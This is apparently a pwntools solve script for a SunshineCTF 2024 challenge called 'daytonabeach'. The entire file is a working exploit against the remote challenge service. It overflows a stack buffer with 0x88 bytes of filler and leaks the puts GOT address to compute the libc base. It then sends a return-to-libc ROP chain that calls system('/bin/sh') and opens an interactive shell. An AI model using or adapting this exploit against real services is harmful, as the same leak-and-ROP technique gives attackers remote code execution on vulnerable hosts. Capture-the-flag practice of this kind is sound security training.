
from pwn import *

# Establish the target / binaries
HOST = "2024.sunshinectf.games"
PORT = 24605
target = remote(HOST, PORT)

elf = context.binary = ELF("../../publish/i95/i95-daytonabeach/daytonabeach")
libc = ELF("../../publish/i95/i95-daytonabeach/libc.so.6")

# Establish the address to leak, and where to return to after
puts_got = p64(elf.got["puts"])
vuln = p64(elf.symbols["vuln"])

# Make the payload
filler = 0x88*b"0"
payload = filler + puts_got + b"1"*8 + vuln

# Send it
target.sendlineafter(b'!\n', payload)

# Scan in the leak
leak = u64(target.recvline().strip().ljust(8, b'\x00'))
#leak = target.recvline().strip(b"\n")
#leak = u64(leak + b"\x00"*(8-len(leak)))

# Calculate the libc base
libc_base = leak - libc.symbols["puts"]
info("base is: " + hex(libc_base))

libc.address = libc_base

rop = ROP(libc)

# Establish needed addresses for system("/bin/sh") call
libc_poprdi = p64(rop.rdi[0]) #p64(libc_base + 0x2a3e5)
system = p64(libc.symbols["system"])
binsh = p64(next(libc.search(b'/bin/sh\x00'))) #p64(libc_base + 0x1d8678)
ret = p64(rop.ret[0]) #p64(libc_base + 0x29139)

# Form the payload for the system("/bin/sh") call)
payload1 = filler + puts_got + b"1"*8 + libc_poprdi + binsh + system

# Send the payload, and drop to a shell
target.sendline(payload1)
target.recvline()
target.recvline()
target.interactive()

